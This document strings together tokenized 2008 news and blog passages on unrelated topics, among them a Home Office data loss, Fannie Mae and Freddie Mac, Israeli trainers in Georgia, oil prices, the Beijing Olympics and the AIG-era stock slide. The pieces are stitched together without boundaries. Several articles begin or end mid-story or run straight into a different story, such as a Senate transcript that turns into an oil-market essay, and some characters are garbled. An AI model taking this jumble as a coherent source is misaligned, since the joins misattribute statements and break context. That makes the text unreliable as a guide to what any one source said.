Mr Smith said : " We expect the Home Office to provide us at the Information Commissioner 's Office with a copy of the [ internal investigation ] report and its findings .
" We will then decide what further action may be appropriate .
Searching questions must be answered about what safeguards were in place to protect this information . "
' Unfit ' Shadow Home Secretary Dominic Grieve said there had been a " massive failure of duty " .
He said : " What is more scandalous is that it is not the first time that the government has been shown to be completely incapable of protecting the integrity of highly sensitive data , rendering them unfit to be charged with protecting our safety .
" The British taxpayer will be absolutely outraged if they are made to pick up the bill for compensation to serious criminals . "
A spokesman for PA Consulting refused to comment on the data loss at the Home Office .

Fannie , Freddie host GOP convention party
House Republicans gave Treasury chief Henry Paulson an earful Wednesday about the administration 's rescue package for mortgage giants Fannie Mae and Freddie Mac .
The two companies will have a chance to make it up to their congressional detractors during a housing industry reception at the Republican National Convention in Minnesota in September .
Fannie and Freddie are sponsoring a reception at the Graves Hotel in Minneapolis on Sept. 2 , along with the Independent Community Bankers of America , the National Association of Home Builders and the National Association of Realtors , according to a copy of the invitation .
But while House Republicans can expect to consume their fill of shrimp cocktail and chardonnay at Fannie and Freddie 's expense , do n't expect to see any Republican senators at the shindig .
In fact , under the 2007 ethics and lobbying law , senators are prohibited from attending lobbyist sponsored bashes at conventions .
The House decided to keep that loophole in place so their members can enjoy the major parties that have been a staple of presidential conventions over the years .
This difference between House and Senate ethics has not gone unnoticed by government watchdog groups .
The title of the reception is " Building Stable Communities for America 's Future , " and invitations went to some of the most outspoken opponents of the administration 's plan to temporarily extend credit to Fannie and Freddie and potentially purchase an equity stake in the two private companies .
This could be the most entertaining event of the entire week if the cocktail party is anything like the closed - door session Wednesday between Paulson and his Republican colleagues in the House .
It might give loyal conventioneers another chance to watch their Treasury secretary arguing with the top Republican on the House Financial Services Committee about who called whom and when over the weekend .
CORRECTION : A lawyer familiar with congressional ethics has contacted The Crypt to point out that senators cannot attend receptions held in their honor , but they can swing by parties sponsored by lobbyists .
So perhaps GOP senators might be able to mingle with Fannie and Freddie execs after all .
Martin Kady II contributed to this story .
Tomer ( alias ) , formerly a soldier of an elite IDF unit , returned from Georgia a short while ago .
He was enlisted by Defensive Shield , a company owned and operated by Brigadier General ( Res. ) Gal Hirsch , to help train Georgian soldiers for battle , but returned disappointed in the manner in which the company handles secret army material .
Hizbullah Leader Nasrallah : Georgia lost because of Israel Roee Nahmias
In speech marking two - year anniversary of Second Lebanon War , Hizbullah secretary - general mocks Israeli political , military leadership : ' Gal Hirsch was defeated in Lebanon , and now lost the war for Georgia ' Nasrallah : Georgia lost because of Israel
Hirsch 's company was responsible for training an elite search and rescue unit , and training was handled by the companies of two other reserve officers , all of which hired ex-soldiers like Tomer .
This resulted in hundreds of former IDF soldiers working as trainers in Georgia over the past few months .
Tomer said he and his friends had at first received guidelines for the handling of covert material , listing what they could and could n't tell Georgian soldiers about IDF activities .
But in actuality , he said , the Georgians were told top secret information .
" When I arrived in the operations room I saw a book of IDF safety instructions that should n't have been there , " he said .
" There were IDF CDs that explicitly said , ' Confidential ' documenting army activities , charts from special units ' operations , and officers ' names . "
He added that the room was not guarded , making this information easily obtainable to everyone .
Tomer said the main reason for the infidelity was mercenary .
" The training companies wanted to finish the projects as quickly as possible in order to create more projects and make more money , " he said .
" We knew the training had to be completed quickly because the soldiers would soon have to get into real military activity . "
He added that the Georgian officers told their soldiers they would be going to help NATO forces in Iraq , while the real objective was Ossetia and Abkhazia .
According to Tomer , Gal Hirsch came to visit the trainers now and then , but was mostly absent .
And when the training was officially over , Tomer did not feel that his soldiers were ready for war .
" By Israeli standards , the soldiers had almost zero capability and the officers were mediocre , " he said .
" It was clear that taking that army to war was illogical . "
By keeping in touch with one of his soldiers , Tomer discovered that most of the men he had trained had indeed been killed in the war .
" Some of them became good friends of mine and invited me into their homes .
It 's hard to digest that these people have suddenly vanished from the face of the earth , " he lamented .
Defense Shield stated in response that " all of the company 's actions were approved by the Defense Ministry , including the materials transferred to the training companies .
The information security standards were set , emphasized , and maintained by experienced security officers , and we have no knowledge of these claims . "
Can anyone tell me how the process of extracting oil from solid rock could be defined as either efficient or renewable ?
I was struck by a story in the Department of Energy office of Energy Efficiency and Renewable Energy ’s weekly electronic newsletter , The EERE Network News , that touted the benefits of developing western oil shale and drilling in the arctic .
I was also struck by how the piece was so politically driven .
In the wake of this week ’s unexpected resignation of EERE chief Andy Karsner , I find the below excerpt from the newsletter more than just a little interesting .
Was Karsner resigning in protest to the Senate GOP ’s blockage of renewable energy tax credits ?
Or was Karsner recognizing that all of his efforts with renewable energy were going to be all for not , because he was employed in an administration hell - bent on petroleum ?
Whatever the answer is , it is hard to believe all of these events are merely coincidental .
From the EERE newsletter :
U.S. Agencies Look to Oil Shale and the Arctic for Petroleum With world oil prices near record levels , the United States is investigating ways to increase domestic petroleum production .
According to DOE ’s Energy Information Administration ( EIA ) , the United States currently consumes 24 % of the world ’s oil but produces only 10 % of it , causing us to import about 60 % of the oil we consume .
One potential new source of domestic petroleum is oil shale , a fine - grained sedimentary rock containing organic matter from which oil can be produced .
The largest known deposits are located in a 16,000 - square - mile area covering parts of Colorado , Utah , and Wyoming , of which about 72 % is on federal lands .
Last week the Bureau of Land Management published proposed regulations for establishing a commercial shale oil program .
Commercial development is not expected for several years , but the U.S. Department of Interior estimates that Western oil shale potentially holds 800 billion barrels of recoverable oil .
The United States consumed about 20.7 million barrels per day in 2006 , so that ’s more than a century of current U.S. oil consumption .
See the Interior Department press release and the EIA ’s “ Energy in Brief ” on U.S. oil consumption .
Meanwhile , the U.S. Geological Survey ( USGS ) has completed its assessment of the undiscovered , technically recoverable oil and natural gas that exists north of the Arctic Circle , an area that includes the northern one - third of Alaska .
According to the USGS , about 90 billion barrels of undiscovered oil lie north of the Arctic Circle , including about 30 billion barrels of oil in the “ Arctic Alaska ” region , which extends to the north , east , and west of Alaska .
That sounds like a lot , but it ’s barely four years of U.S. oil consumption .
With a decreasing amount of sea ice in the Arctic , many Northern nations are now considering the future possibility of offshore oil exploration in the Arctic Circle .
See the USGS “ Circum - Arctic Resource Appraisal . ”
Of course , other options available in the United States are increased drilling of conventional resources and reduced petroleum demand .
According to the American Petroleum Institute ( API ) , domestic oil and gas drilling is already up , with 50 % more exploratory well drilled in the second quarter of 2008 than in the corresponding period a year ago .
While most of that drilling is targeting natural gas , an estimated 5,219 oil wells were completed in the second quarter , marking the highest number of second - quarter oil well completions since 1986 .
The API also notes that U.S. oil demand was down significantly for the first half of 2008 , with deliveries of all oil products down by 3 % , for an average demand of 20.08 million barrels per day .
As a result , U.S. oil imports sank to their lowest first - half level since 2003 , at less than 13 million barrels per day .
See the API press releases on the drilling activity and the petroleum demand .
Does n’t it seem to you that it is outside the office of Energy Efficiency and Renewable Energy ’s scope of responsibility to be preaching about the benefits of developing oil - shale and drilling in the arctic ?

The Decisive Moment by Henri Cartier - Bresson
is arguably the most important photo book of the 20th century , of supreme interest to photojournalist or documentary photographers and for the history of photography in general .
Unfortunately , it is out - of - print & even the most raggedy copies sell to collectors for a minimum $ 500 .
Although many or most of the bookÕs 126 images have been reprinted individually & in other compilations of Bresson 's work , The Decisive Moment collection itself is unique in providing an international portrait or impression of humanity during the two decades prior to its publication in 1952 .
The arrangement & juxtapositions of the images have never been repeated , like the carefully sequenced songs in an album from a great rock group .
Cartier - Bresson wrote in his introduction : ÒI craved to seize the whole essence , in the confines of one single photograph , of some situation that was in the process of unrolling itself before my eyes . Ó
Simon & Schuster , the publisher , & Magnum Photos which represents the artist Õs estate , need to be urged to reprint the book .
I do n’t want to weigh in on the whole “ does he deserve an Oscar ” dispute , because I do n’t really put any stock in the Academy Awards .
It ’s mostly a Hollywood “ let ’s all smell our own farts ” circle jerk fiasco .
That said , having seen “ The Dark Knight , ” I can honestly say that no actor has ever brought the character of the Joker to life like Heath Ledger .
His performance ( Oscar worthy or not ) was phenomenal .
I ’ve always hated the “ funny Joker ” and Heath must have sympathized .
His Joker was the psycho nutbox that kills people just to see what will happen .
He ’s an instrument of chaos with no direction or design .
That ’s what makes him the perfect foil for Batman .
It ’s order vs. chaos .
Self control vs. instinct .
Man vs. animal .
That ’s a struggle I can believe in 100 times over “ I kill because I ’m crazy and it ’s funny . ”
Heath Ledger / Dark Knight Links for your perusal :
Tom is pleased he underwent the operation A teenage cancer patient has undergone successful surgery to rebuild his shoulder using his elbow .
Tom Lemm , 15 , from Pontefract , had his left arm amputated by surgeons at Leeds General Hospital because of a tumour at the top of the limb .
Doctors used tissue and muscle from his unaffected elbow to create a new shoulder in what is believed to be the first UK operation of its kind .
Tom 's surgeon said the shoulder would be able to support an artificial arm .
In the operation , the whole arm and the shoulder joint were removed .
The surgeons then used the elbow joint and tissue from the arm to reconstruct a shoulder joint .
By using the bits that would be discarded , you can pluck a little bit of comfort
Professor Simon Kay
A metal plate was then inserted into Tom 's collar bone , and the new joint grafted on to the area where his shoulder was .
Professor Kay told the BBC : " The most awful thing for an upper limb reconstructive surgeon to do is to remove an arm - it 's a dreadful thing to do .
" But by using the bits that would be discarded , you can pluck a little bit of comfort . "
He said Tom 's new shoulder will be able to support an artificial limb .
" This will be a tremendous advantage . " ' I hope it gives hope '
The first operation of this kind was carried out by a team in Japan , but Professor Kay said he believed this was the first time this has been done in the UK or Europe . "
A spokesman for the hospital said : " We are delighted Tom is making a good recovery and that he is pleased with the outcome of the specialised surgery undertaken by the team here at Leeds General Infirmary .
" We wish him well and look forward to seeing how he is progressing on his next visit . "
Tom , who has had cancer for three years , told the Sun newspaper : " I was very upset at losing my arm but then the prof told me what he planned to do .
" I hope the fact it has worked for me gives others hope . "

What are these ?
Hillary Clinton and many Senate Democrats pounded away at the economic policies of Bush and McCain .
Clinton :
What we have seen over the course of the last eight years is an administration that refused to recognize the threats lurking in our economy .
No matter what lurked just beneath the surface or what problems were facing middle - class families .
Now , we know that many C.E.O.'s are paying lower tax rates than their receptionists .
We know that President Bush and those who carry his mantle seek to lower those taxes even further .
Middle - class families have seen their wages decline even as the cost of living has skyrocketed .
This administration has the worst job creation record in 70 years .
Millions of families were locked into ballooning and unaffordable adjustable - rate loads as this administration stood by denying there was a crisis .
Regulators and regulations designed to keep pace with the markets have been steadily chipped away by Washington Republicans even as companies experimented to the tune of hundreds of billions of dollars in ever more complex and risky financial instruments .
More transcripts below the fold :
( from the C&L email inbox ) :
Senator Whitehouse goes there and fingers McCain 's involvement in the S&L scandal .
Points out how McCain and the Bush administration have always been on the side of the deregulation of " crooks and schemers " who have created this current economic mess :
No matter what one presidential candidate may think , the fundamentals of our economy are far from strong .
Our economy is off the rails .
For the past eight years , the Bush administration has preached over the financial markets a gospel of uncontrolled deregulation .
Simply leave the banks and the financiers and the lenders to their own devices , they said , and all will be well .
Well , all is not well .
Markets are places where people come to make money .
They do n't come for altruistic motives .
And some are clever enough , when they come to those markets , to try to rig or gain the market in their favor , to gain monopoly power , to hide information , to cheat , to create special advantage .
In short , to find a way to gull the suckers .
Markets need to be defended against that age - old risk .
Markets have to operate honestly , transparently and reliably .
And that 's where regulation comes in .
That 's how markets are defended against crooks and schemers .
Special interests constantly seek special advantages and it's the regulators ' job to push back .
In that constant struggle of the special interests against the regulators , the Bush administration always took the side of the special interests .
They have systematically undercut the regulators in their efforts to keep markets safe , and now here we are .
And Senator McCain has been against the regulators even back to the savings and loan scandals of the 80's .
The schemers , the manipulators , the Enrons , the subprime mortgage packagers , the oil market speculators , the credit default slop artists , they all found a friend in the Bush Administration , they all found an ally in Bush - McCain policies of deregulation , and now here we are .
Senator McCaskill just clowns the Bush - McCain Republicans new found love for market regulation :
Now here 's the thing that is killing me .
It 's just killing me .
All of the folks that have been screaming deregulation - get the government off our back .
Evil government off our back .
Big , bad government off our back .
Deregulate , deregulate , deregulate .
In last 24 hours there has been ... remember the transformer toy that 's went from animal to a massive machine , well , we have transformers around here .
These massive deregulation advocates all of a sudden , we 've got to enforce rules on Wall Street .
We 've got to regulate .
Come on .
Do you think we 're dumb ?
You can't transform overnight from a big , bad deregulator to I 'm now the cop on the beat .
I 'll take care of Wall Street .
It 's not honest .
Be principled .
Either you 're a deregulator and you want to live with these consequences and you want to say to the American people , hey , when we deregulate , this is the risk .
This is the risk that we are taking with your money .
They are going after the status quo .
Many of my friends on the other side of the aisle , they 're fighting the status quo .
And guess what ?
They created it .
This was their plan .
It did n't work out .
It did n't grow our economy .
It did n't create jobs .
American families for the first time in our history have gone down in terms of their average income .
For the first time our history America is not growing .
Our prosperity is not growing .
Senator Clinton gets snarky saying how no one could have predicted this current mess while mocking the claim of " fundamentals " of our economy for being strong :
What we have seen over the course of the last eight years is an administration that refused to recognize the threats lurking in our economy .
No matter what lurked just beneath the surface or what problems were facing middle - class families .
Now , we know that many C.E.O.'s are paying lower tax rates than their receptionists .
We know that President Bush and those who carry his mantle seek to lower those taxes even further .
Middle - class families have seen their wages decline even as the cost of living has skyrocketed .
This administration has the worst job creation record in 70 years .
Millions of families were locked into ballooning and unaffordable adjustable - rate loads as this administration stood by denying there was a crisis .
Regulators and regulations designed to keep pace with the markets have been steadily chipped away by Washington Republicans even as companies experimented to the tune of hundreds of billions of dollars in ever more complex and risky financial instruments .
Now , we were reassured that the risk was too diversified and investments too sophisticated to put our economy in jeopardy .
Meanwhile , behind closed doors , the cracks were showing as the value of the mortgage - based securities slipped day by day by day .
And the President and his supporters in Congress repeatedly changed and still chant the mantra today - that the fundamentals of our economy are strong .
I wish we had taken action long before this for the sake of all my constituents , but now we must have a concerted , focused effort .
I do n't believe we can wait until the next president .
I am extremely hopeful and optimistic that we will have a president who will work with us to resolve our economic challenges , but I do n't think we can wait .
Clinton calls for decisive action to confront the crisis saying no option should be off the table :
So , beyond the semi - glib answer that nothing much has in fact happened in the oil markets in the past month ( after all , the recent decline is still smaller , in percentage terms , than several others in the past couple of years ) , here are a few points worth making .
I have been gently chided on the internets for not doing any Countdown diaries since the oil prices have started going down .
While the giddiness and glee demonstrated by many in the traditional media and elsewhere invites little but ridicule , as demonstrated by this graph below , prepared for the Oil Drum , some serious questions have been raised and deserve answers .
" It was speculation and the bubble has popped "
" Such small variations in demand or supply cannot explain such price changes "
" What about the Iran war premium - that 's speculation right ? "
" Demand is down ( in the US ) , prices will go down back to normal "
" Asians will reduce their demand too "
Many do n't agree with my assertion that speculation has little or nothing to do with the run-up in oil prices , and consider that the brutal price increases , followed by just as brutal price decreases , cannot be explained by fairly small changes in supply or demand figures .
Let me try to explain again why , in today 's conditions , small variations have precisely such consequences .
In a market where supply is plentiful , balancing the market will be done by supply adjusting , ie the price will be such that just the required volume of oil is extracted to fulfill demand , and no more .
In that case , competition between suppliers plays in full , and the price will the be the marginal cost of supply , is the cost of the most expensive barrel needed to fulfill exactly demand .
All cheaper producers will get that same price ( and will make a nice profit the cheaper their costs are ) , and those that are more expensive wo n't produce .
In such circumstances , variations in demand ( or new supply coming online ) can only cause price to move slowly along the production cost curve , and bigger price movements usually come from " above ground " factors , ie geopolitical crises that include a risk of major disruption of supply .
But if you move to a market where supply is fully used to satisfy demand , you enter a whole new world .
In that case , if potential demand still increases , there is no supply in the short term to fulfill such demand , and the absolute requirement for physical balance of the market translates ( beyond using stocks , which can only be temporary ) into a need to destroy demand , ie for some potential users to forego using oil .
As we all know , oil is really convenient , and we are all unwilling ( and , in many cases , unable ) to stop using it .
And yet the demand destruction needs to happen .
In the short term , that requires prices to go high enough to convince someone to stop using the stuff , either because s/he can't afford it , or because s/he chooses an alternative which is less convenient but cheaper and , at such level of saving , worth the hassle .
In such circumstances , short term price movements can and will be quite violent .
In fact , any event that disturbs supply , any news that shows that demand was higher than expected , or supply less than hoped , or that suggest that demand will be higher than thought , or supply lower than expected , will push prices up immediately ( and the opposite news , down , of course ) , because thee news translate into a unbalance between supply and demand and a bigger need for demand destruction ( conversely , a lower need for such ) .
So , a pipeline blows up in Nigeria - bam , 200,000b/d of ( high quality ) oil off the market , demand destruction is needed !
Ben Bernanke suggests that a recession is unavoidable - psssh , prices go down as a slower economy will translate into less demand for oil , and thus less demand destruction will be required ;
Oil storage goes up - aha , demand was lower than we thought ( or supply higher ) in the last month , and there will be less need for demand destruction in the next one !
Bush agrees to direct talks with Iran - bam , the war premium goes down , as the probability of an oil - supply - endangering conflict ( which would cause a massive and brutal need for demand destruction , unless strategic storage is tapped ) goes down .
In fact , in the past month , these was a succession of news that all went in the same direction .
In the same week , Bernanke was extremely bearish on the economy , oil stocks were higher than expected , and talks with Iran happened .
Each of these took about 3 - 4 % each from the price of oil , bring the price down by more than $ 15 in 3 days .
And any time this happens , speculators are wrong footed and they need to close out their positions , which usually reinforces temporarily the underlying movement ( haha !
so there are speculators !
And they push prices around !
Well , yes , there are speculators - but , for the most part , they follow the market rather than driving it .
Any price overshoot is usually temporary .
And they do provide valuable services , by bringing in liquidity to prices - and by providing willing counterparties to those that want to buy hedges - you know , like airlines that buy futures or options for their supply over the next few months or quarters at prices to protect themselves - and their fares - from yet higher prices ) .
: : ::
One point that needs to be made again is that demand destruction in the US ( or even in Europe , where it is hapoening too ) is not enough on its own to bring prices down , because it needs to be larger than the supply growth in the rest of the world to limit the requirement for further demand destruction and price rises , given that production is still largely stagnant .
And the problem is that demand is not growing just in China and India , thanks to rapid growth , it is also growing massively in oil producing countries themselves ( Saudi Arabia , Iran , Russia , Venezuela ) , which often subsidize gas and which can afford it given that they have a natural hedge against ( the subsidy gets bigger when oil prices are higher , ie when their own income is bigger , and the income growth is larger than the subsidy growth for those that export any volumes ) .
In fact , most of the demand destruction happens in price sensitive places , like the poorest oil - importing countries ( but they were n't burning much of it anyway ) , and the rich world ( which can still afford oil , but consumes lots of it ) .
But we can't be sure it happens fast enough to actually cause prices to go down because of what 's going on in the rest of the world .
Anything that encourages demand reduction elsewhere ( like lower subsidies ) helps to bring prices down , but it's by no means obvious that we 've reached price levels that are sufficient to cause overall demand stagnation in the face of flat or quasi - flat production .
Oil producers have little or no incentive to boost their production if they expect prices to keep on creeping up ( and they can help that trend by , precisely , investing less ) , and it's not clear what substitutes are available in any meaningful volumes .
So , at this point , I 'm still happy to continue my " Countdown to $ 200 oil series " and see no reason why the recent lull in prices would be a sign of a serious trend change in the market .
In fact , I 'll say again that our energy policies should focus on one thing first and foremost : demand reduction .
Any reduction in demand that we manage in excess of what market forces would ( precisely ) force us to do will get prices down , and will save us a lot of money - and the smartest demand destruction is the permanent kind , that brings savings every month and every year rather than one - offs like giving up a trip .
We have to reduce our demand .
Let 's do it in an organized way rather than a panicked , haphazard , inconsistent way .
And that 's where government can help , by providing longer term pespective , informing citizens , pushing infrastructure in the relevant direction , and bringing up standards that apply to all equally and guide individual behavior in the right ( Energy Smart ) direction .
Price mechanisms work , but they are brutal , hurt the poor the most , and cause unnecessary disruption to economic activity , and pain to many .
And they are fickle , as the current volatility ( which , as I explained above , is likely to remain ) causes rapidly changing signals which prevent decisions from being taken .
WOW !

Weddings in space could be right around the corner , and experts figure the inevitable cosmic consummation will be just around the next corner .
The Japanese firm First Advantage and the U.S. - based private spaceflight firm Rocketplane Global , Inc. , announced last week they will host weddings in space for about $ 2.3 million ( 240 million yen ) apiece .
For all we know , sex in space has already taken place .
But NASA officials are n't talking about that much .
Beyond space tourism as a platform for steamy shenanigans , space missions are the perfect petri dishes for close encounters , and this year NASA certainly has a busy flight schedule , with five missions planned .
And more countries than ever are now venturing into space , with Japanese astronaut ?
Koichi Wakata slated to become Japan 's first long - duration space flyer this year and China gearing up for its first spacewalk scheduled for October .
Things will get even more interesting with future long - duration missions envisioned for the moon , Mars and beyond .
" To say that astronauts are some superior beings who cannot have interests in any kind of sexual feelings for three years ?
I just do n't buy it , " said Jason Kring of Embry - Riddle Aeronautical University in Florida .
Kring also pointed out the possibly negative consequences of pregnancies in a microgravity environment .
" Are we going to sterilize our crew members before sending them to Mars ? " said Kring , who studies the psychological effects of long - duration space missions .
Meanwhile , nobody claims to know whether " it " has happened already in space .
" We do n't study sexuality in space , and we do n't have any studies ongoing with that , " said NASA spokesman Bill Jeffs of the Johnson Space Center in Houston .
" If that 's your specific topic , there 's nothing to discuss , " he added , referring to " sex in space . "
In any case , science journalist Laura Woodmansee , who penned " Sex in Space " ( CG Publishing Inc. , 2006 ) , predicts " honeymoons in space and out - of - this - world sex will be a reality within a decade . "
Close encounters
Small groups tapped for lengthy space stints will likely experience related psychological effects .
For instance , trivial annoyances could become divorce - level issues for couples .
Other interactions are likely to be far more enjoyable .
Here on Earth , the closest analog to long - term isolation of groups in space is the South Pole , where about 200 researchers live year - round .
Last month , before six months of winter darkness descended over Antarctica 's McMurdo Station , the research base received a delivery of about 16,500 condoms .
" There 's an unspoken behavior there [ at the polar base ] where you take a spouse for the time you 're there ?
you have an exclusive relationship with someone , " Kring told SPACE.com .
" It 's understood that when you leave , that relationship is over . "
He added , " I do n't know how it 's going to work on a three - year mission to Mars . "
Lawrence Palinkas , a professor of social work , anthropology and preventive medicine at UCLA , agreed .
" Certainly at polar research stations , there 's sexual relations , sexual contact , between men and women , " Palinkas said .
" On a three - year mission to Mars , that 's a possibility as well , although NASA in the past has tried to downplay the need for and the implications of sexual needs on a mission that long . "
Coed crews
Up until the 1980s , NASA crews were all male .
In 1983 , Sally Ride became the first American woman in space aboard the shuttle Challenger .
Missions now routinely include one or two women .
" [ For ] a true long - duration mission if we go to Mars or back to the moon , politically , I do n't think you 're going to see an all male or all ' American ' crew , " Kring said .
Politics aside , " research would suggest that a mixed crew of men and women would probably be best , " Kring said .
" And this goes back to the Antarctic research where it used to be the expeditions were all men . "
Nonetheless , co-ed crews , like the all - male ones , will have hefty workloads and little play time .
" They 're mission - oriented .
They 're very focused on the task at hand , " said NASA spokesperson Nicole Cloutier - Lemasters of the Johnson Space Center .
Sexual frustration could ensue , however .
" Human sexuality is a basic need and now you 're trying to tell people , ' Hey for three years , you can't do that . '
They 're going to figure out a way to do it , " Kring said .
If they do , they 're on their own for now .
Palinkas said there " is no official policy " at NASA regarding sex on space missions .
" There really has been no research conducted on the area to know whether it [ sex in space ] would be a good thing or a bad thing , " he said , " but it probably is inevitable . "
How it works
Sex is about more than psychology and rules and mission plans , of course .
And when you get down to it , the key to successful sex in space is about managing a microgravity environment .
In " Sex in Space , " Woodmansee describes several positions that might work , ranging from the modified missionary position to seated with " interlocking Y legs . "
Props also could come into play , including a shared elastic waistband or tethers to hold one partner to a stable structure , she writes .
Mr Chavez said Russia and Venezuela would cooperate in various fields
Hugo Chavez has called for a strategic alliance with Russia to protect Venezuela from the US .
The Venezuelan president 's call came as Moscow and Caracas agreed to extend bilateral co-operation on energy .
Speaking during a two - day visit to Russia , Mr Chavez said oil and military cooperation were vital to guarantee Venezuela 's sovereignty .
Russian President Dmitry Medvedev said three Russian energy companies are to be allowed to operate in Venezuela .
He gave no details of an anticipated arms deal between the two countries .
But Mr Chavez seemed upbeat about the prospect of military co-operation .
" If Russia 's armed forces want to be present in Venezuela , they will be given a warm welcome , " he told a news conference after the meeting .
He said Venezuela would pursue new Russian arms deals " because the North American empire ... has plans to invade Venezuela , to disarm Venezuela " .
Strategic partnership
Venezuela 's president said he had felt " strong human warmth " during the meeting with his Russian counterpart , adding that " personal chemistry immediately appeared between us " .
Mr Chavez held warm talks with Russian Prime Minister Vladimir Putin
" We are considering issues linked to our strategic partnership , be it in the energy sector , industry , finance , science and technology , or military issues , " said Mr Chavez .
Following the talks , Mr Medvedev said Gazprom , Lukoil and TNK - BP would be allowed to operate in Venezuela 's resource - rich Orinoco Belt .
" Venezuela is now the most important partner of the Russian Federation , " said the Russian president , a former chairman of Gazprom .
He said a proposal to create a group of leading gas producers similar to the oil cartel , Opec , had not been abandoned .
During his stay in Russia , Mr Chavez also held warm talks with Russian Prime Minister Vladimir Putin , focusing on economic and military co-operation .

I 'm continuing to sift through the post debate analysis from Friday night so we can get a glimpse at what some conservatives had to say about the Ole Miss Friday night not - pay per view - event .
First Dick Morris thought Obama won and now Charles very clearly gave the advantage to Obama .
It 's interesting when a political opponent gives a non partisan explanation now and again .
Download
Krauthammer : I thought he hammered a little bit , he kept repeating , 'my opponent is n't experienced , he does n't have the judgment , he 's not ready , ' but he 's gotta make the case .
And except for the last moment , I think McCain had a poetic moment when he very quietly and softly ended by saying I know how to heal a nation after a war , I know who to deal with adversaries and with ...
I thought he was hammering a lot .
Now , there styles are different .
McCain is a guy who hits , he hammers , he jabs .
Obama is smooth , he 's very elegant and he was nimble and here 's a subject in which you 'd think he be alien , but he was never flustered , he was never at a loss .
I think he was on the defensive on a couple of issues like Iran , but that 's because of statements he made earlier in the campaign .
I thought he came out only slightly behind on foreign affairs , thus overall in the absence of a sound byte , in the absence of an embarrassing moment on his part , I think he comes out of this neutral and thus ahead because we 're now going to have debates on the economy which are going to be his strong areas and McCain will be on the defensive ....
It does end the drama of the McCain week .
Yes , no sound bytes to pounce on .
CK uses some weird language to make his point , but what he said is round one goes to Obama and that was a very important round indeed .
I was against foreign policy being the lead topic of the three debates because it had the ability to side track the favorable polling news that has changed since the economic meltdown began for Obama , but it turned out pretty good so far ... Lindsey Graham certainly was grumpy about it .

Despite the supposed political neutrality that the Olympic Games carries within its very essence , some had come to question the morality and correctness of holding the games in a state with a questionable human rights record .
Nonetheless , the anticipation was tangible .
The city was tended to with the greatest of care , awaiting athletes and competitors from across the globe to come to the nation ’s capital city , in awe of the greatest sports extravaganza the world had ever seen .
Advertisements
It was a chance to show off the state to the people of the world , of their model government , to showcase the glories of their culture and achievements of its citizens .
The site : Berlin .
The year : 1936 .
Hitler ’s Olympics are perhaps the most controversial to date , although that honor , as it were , may be forever surpassed by the games to be held in just a matter of days in Beijing , China .
Or so would the detractors of the Beijing games like you to believe .
For the record , it must be noted that the awarding of the games to Germany was prior to the rise of the National Socialist German Worker ’s Party ( aka the NSDAP aka the Nazi Party ) and Hitler ’s ascension to the Chancellery , making the choice of Berlin a bit less notorious as one might suspect .
The great alleged controversy of this current Olympiad – the 29th Summer incarnation – is that given China ’s record pertaining to human rights abuses , coupled with a distinct lack of freedom and justice , makes the choice of Beijing incompatible with the spirit of the Olympics , and its Charter .
The Charter clearly makes note of the Olympic movement ’s desire for , “ respect for universal fundamental ethical principles . ”
China , given its grevious violations , clearly defies this Article ( 1 ) of the Charter .
Stop right there , protest supporters of China .
The Olympics are not about politics or internal matters , but merely athletics , and a spirit of camaraderie , in reflection of the ancient games held centuries ago at Olympia .
That ’s all well and good , and even perhaps a bit fanciful , but the truth is far more apparent : of course the Olympics are political , they likely always have been , and always will be .
Politics reared its ugly head in the tit - for - tat boycotts 1980s , when the Soviet Union boycotted the 1984 Los Angeles games after the United States and others did not participate in the Soviet games of 1980 , as a result of the Soviet invasion of Afghanistan .
And it would seem , no matter the records of individual host nations in the fields of human , civil , political , or even economic rights , the IOC seems less interested in those matters than the ability of the host state to present memorable , stable , successful games .
The Soviet Union was chosen despite its poor showing in the field of human rights ( e.g. Berlin Wall ) .
So why the hysteria over the decision to award the games to China ?
Recent upheavals in Tibet and the subsequent crackdown have fueled the angst of those in the West , weary of the Chinese government ’s hard hand .
Additionally , stories of Chinese espionage in the United States and recalls of made in China goods have fanned the flames of anti-Chinese sentiment .
Are the objections over the Chinese holding the games legitimate ?
Of course .
Will the regime use the games for propaganda reasons ?
Certainly .
Will another state with dubious credentials ever hold the Olympics again ?
Yes , and many in the international community will point to the following certainty :
it ’ll be just a matter of time before the five ringed Olympic flag flies over the United States again .

NEW YORK ( CNNMoney.com ) --
Stocks plummeted Wednesday , with the Dow industrials falling 449 points in its second worst session of the year , as the government 's emergency rescue of AIG amplified fears about the stability of financial markets .
The Dow Jones industrial average ( INDU ) lost 449 points , or 4 % and fell to the lowest level since November 2005 .
The Standard & Poor 's 500 ( SPX ) index lost 4.7 % and fell to its lowest point since April 2005 .
The Nasdaq composite ( COMP ) lost 4.9 % and ended at its lowest point since August 2006 .
Selling pressure eased in the mid-afternoon as the jump in oil and gold prices boosted the underlying stocks .
But any recovery attempt lost steam and the market finished the session just above the worst levels of the day .
After the close , a New York Times report said that Morgan Stanley ( MS , Fortune 500 ) was considering a merger with Wachovia ( WB , Fortune 500 ) or another bank .
Morgan Stanley ( MS , Fortune 500 ) shares had tumbled 24 % during the session on worries about its profits and ability to raise capital , even though the company announced better - than - expected quarterly results Tuesday night .
Goldman Sachs ( GS , Fortune 500 ) also slumped despite having reported better - than - expected results .
( Full story )
Also after the close , a Wall Street Journal report said that Wells Fargo ( WFC , Fortune 500 ) and Citigroup ( C , Fortune 500 ) have expressed interest in Washington Mutual ( WM , Fortune 500 ) , the mortgage lender that has seen its business erode in the housing market collapse .
Financial stocks tumbled .
The Philadelphia KBW Bank ( BKX ) index fell almost 8 % and the Amex Securities Broker / Dealer ( XBD ) index fell over 10 % .
Small cap stocks were hit , too , with the Russell 2000 ( RUT ) index sliding 4.8 % .
The Dow Jones Wilshire 5000 Composite Index , an index that measures the value of 5,000 U.S. - based companies , fell 4.6 percent , giving investors an overall paper loss of approximately $ 700 billion .
The selloff comes in the wake of the government 's bailout of Fannie Mae and Freddie Mac , Lehman Brothers ' bankruptcy , Merrill Lynch 's sale to Bank of America and ongoing worries about Washington Mutual and other firms .
" There 's a fear of a financial system meltdown going on , and it 's grounded in the headlines we 're seeing about the series of firms that are in trouble , " said Paul Rabbit , president of Rabbit Capital Management .
Meanwhile , a measure of corporate borrowing costs surged to levels not seen since around the time of the crash of 1987 , according to reports .
Stocks slumped Monday , with the Dow losing 504 points after Lehman Brothers declared bankruptcy and AIG plunged amid worries about its solvency .
Stocks bounced a bit Tuesday when the Federal Reserve held interest rates steady , cooling fears that the economic outlook has deteriorated on the financial market crisis .
But the reprieve from the selling was a short one , with a broad - based selloff in place Wednesday .
Rabbit said stocks were also under seasonal pressures , with September typically the worst month of the year for the major gauges .
